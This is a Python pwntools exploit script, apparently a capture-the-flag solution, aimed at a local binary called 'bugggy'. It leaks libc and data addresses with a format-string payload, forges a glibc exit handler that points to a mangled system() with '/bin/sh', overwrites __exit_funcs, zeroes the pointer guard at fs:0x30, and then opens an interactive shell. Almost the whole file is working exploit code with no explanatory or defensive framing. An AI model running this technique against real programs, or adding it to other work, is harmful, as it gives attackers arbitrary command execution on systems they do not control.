#!/usr/bin/env python

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'neww']


libc = ELF('./libc.so.6')

def mangle(addr):
    # since system's offset is 0000000000055410. (objdump -T libc.so.6 | grep system)
    # 0x10 means '\n'
    # so plus 1 to avoid '\n'
    addr += 1
    # fs:0x30 is zero, all we need is left shift 0x11
    return (addr<<0x11)&(2**64 - 1)
    

r = process('./bugggy')
#r = remote('localhost', 3517)

# leak libc_base and Data address (though we can calculate Data address by libc_base)
r.sendlineafter('name', '%7$p%29$p')
r.recvuntil('0x')
Data = int(r.recvn(12), 16)
r.recvuntil('0x')
libc_base = int(r.recvn(12), 16) - 0x270b3

print("Data @ ", hex(Data))
print("libc_base @ ", hex(libc_base))

system = libc_base + libc.symbols['system']
sh = libc_base + 0x1b75aa 
__exit_funcs = libc_base + 0x1eb718


payload = flat(0, 1, 4, mangle(system), sh) # fake exit_fn
r.sendlineafter('?', b'Yes'.ljust(8, b'\x00')+payload)

fake_exit_fn_addr = Data + 0x18
fs_30 = libc_base + 0x1f3570 # fs:0x30

print('__exit_funcs @ ', hex(__exit_funcs))
print("fake_exit_fn_addr =  ", hex(fake_exit_fn_addr))

# partial overwrite __exit_funcs to our fake exit_fn address
r.sendlineafter('scanf\n', str(fake_exit_fn_addr&0xffffffff)+" "+str((__exit_funcs - fake_exit_fn_addr)//4))

# zero out fs:0x30
r.sendlineafter('again ?\n', str((fs_30 - fake_exit_fn_addr - 0x8)//8))

r.interactive()
